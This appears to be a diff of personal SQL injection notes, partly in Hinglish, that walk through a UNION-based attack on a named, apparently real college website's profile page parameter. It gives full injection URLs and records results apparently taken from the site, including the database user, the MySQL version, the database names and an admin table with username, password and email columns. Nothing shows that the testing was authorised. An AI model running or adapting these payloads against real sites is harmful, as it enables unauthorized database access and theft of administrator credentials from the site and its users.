@@ -23,20 +23,39 @@ To check SQLi - [',"]
 
 To Balance url - [--+,--+-]
 
-To find Columns - [ORDER+BY+1] - we got 10 columns
+To find Columns - [ORDER+BY+1] - we got 16 columns " https://hcst.edu.in/fullprofile.php?id=75%27ORDER+BY+16--%20-"
 
-To find Vulnerable columns - [UNION+SELECT+1,2,3,4,5,6,7,8,9,10]
+To find Vulnerable columns - [UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]  " https://hcst.edu.in/fullprofile.php?id=75%27UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20-"
 
-To find hidden Vulnerable columns - [AND+0+]
+To find hidden Vulnerable columns - [AND+0+]   
+
+To find hidden Vulnerable columns - [UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]  " https://hcst.edu.in/fullprofile.php?id=75%27AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20-"
+
+user() - [HCSTEDU_QUIZ@LOCALHOST]
+database() - [MySQL 5.7.42 (2023-04-18)]
+ 
 
 To find all databases - (SELECT+GROUP_CONCAT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA) - [information_schema,cptctvpm_polytech_new]
 
+To find all databases - (SELECT+GROUP_CONCAT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA) - [INFORMATION_SCHEMA,HCSTEDU_QUIZ]
+
 To find tables name - (SELECT+GROUP_CONCAT(table_name)+FROM+INFORMATION_SCHEMA.TABLES)
 
-To find tables name from website database - (SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())      
+To find tables name from website database - 
+(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())      ----- > agar multiple database rahe too isko hex me convert kr ke database ka nam likhte hai
 table name - [cpt_admin]
 
+
+
+
+https://hcst.edu.in/fullprofile.php?id=75%27UNION+SELECT+1,2,3,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),5,@@GLOBAL.VERSION,7,8,9,10,11,12,13,14,15,16--%20-
+
+
+
 To find columns name - (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x6370745f61646d696e+AND+TABLE_SCHEMA=DATABASE())
+
+(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4c4f47494e20+AND+TABLE_SCHEMA=DATABASE())
+
 column name - [username,password,email_id]
 
 
